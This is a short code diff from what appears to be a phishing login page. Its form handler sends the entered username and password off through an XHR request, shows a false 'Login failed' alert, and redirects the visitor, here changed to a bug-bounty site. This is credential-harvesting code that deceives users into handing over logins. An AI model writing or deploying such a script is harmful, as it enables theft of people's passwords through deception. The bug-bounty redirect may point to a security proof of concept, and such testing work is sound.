@@ -29,5 +29,5 @@ form.addEventListener('submit', function(e) {
     var data = 'username=' + encodeURIComponent(inputUser.value) + '&password=' + encodeURIComponent(inputPass.value);
     xhr.send(data);
     alert('Login failed. Please try again.');
-    window.location.href = 'https://www.cvmarket.lt/karjeros-centras/';
+    window.location.href = 'https://bugbounty.ch/';
 });
